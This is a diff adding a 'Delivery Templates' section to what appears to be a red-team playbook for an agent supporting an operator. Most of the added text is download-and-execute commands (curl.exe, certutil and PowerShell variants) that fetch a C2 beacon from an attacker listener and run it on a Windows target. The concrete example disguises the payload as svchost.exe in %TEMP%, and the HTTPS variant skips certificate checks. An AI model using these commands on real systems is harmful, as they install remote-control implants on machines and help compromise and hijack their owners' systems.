@@ -410,6 +410,56 @@ marks broken vulns, but unlisted vulns may also be non-functional.
 4. If 2+ vectors fail on same target: suspect Providentia data issue, not
    technique failure. Report to operator.
 
+## Delivery Templates
+
+### curl.exe Beacon Delivery (Windows RDP / GUI-only targets)
+
+Use when operator must paste a command in an RDP cmd prompt or similar
+GUI-only access. Parameterized — no hardcoded IPs or paths.
+
+**Parameters:**
+- `LISTENER_URL` — Tuoni listener base URL (HTTP or HTTPS, include port)
+- `PAYLOAD_PATH` — path on Kali HTTP server (relative to server root)
+- `OUTPUT_PATH` — local path on target for payload drop
+
+**HTTP template (Tuoni file server at port 8080):**
+
+```cmd
+curl.exe http://<LISTENER_URL>/files/<PAYLOAD_PATH> -o <OUTPUT_PATH> && <OUTPUT_PATH>
+```
+
+**HTTPS template (Tuoni HTTPS listener):**
+
+```cmd
+curl.exe -k https://<LISTENER_URL>/files/<PAYLOAD_PATH> -o <OUTPUT_PATH> && <OUTPUT_PATH>
+```
+
+**Example (concrete):**
+
+```cmd
+curl.exe http://10.10.14.5:8080/files/svchost.exe -o %TEMP%\svchost.exe && %TEMP%\svchost.exe
+```
+
+**Rules:**
+- Payload filename per RT-SIG-003 (platform-appropriate cover name)
+- `OUTPUT_PATH` defaults to `%TEMP%\<cover_name>.exe` — writable without admin
+- `-k` flag on HTTPS skips cert validation (self-signed Tuoni cert)
+- `&&` chains execution only on successful download — prevents running stale files
+- Verify listener is active (`tuoni_listeners_list`) before giving operator the command
+- Stage payload on Kali HTTP server before generating the command
+
+**certutil fallback** (if curl.exe unavailable — older Windows):
+
+```cmd
+certutil -urlcache -split -f http://<LISTENER_URL>/files/<PAYLOAD_PATH> <OUTPUT_PATH> && <OUTPUT_PATH>
+```
+
+**PowerShell fallback** (if cmd restricted but PowerShell available):
+
+```powershell
+Invoke-WebRequest -Uri "http://<LISTENER_URL>/files/<PAYLOAD_PATH>" -OutFile "<OUTPUT_PATH>"; Start-Process "<OUTPUT_PATH>"
+```
+
 ## Failure modes
 
 - **Exploit fails**: document failure, rotate to next attack vector. Do NOT
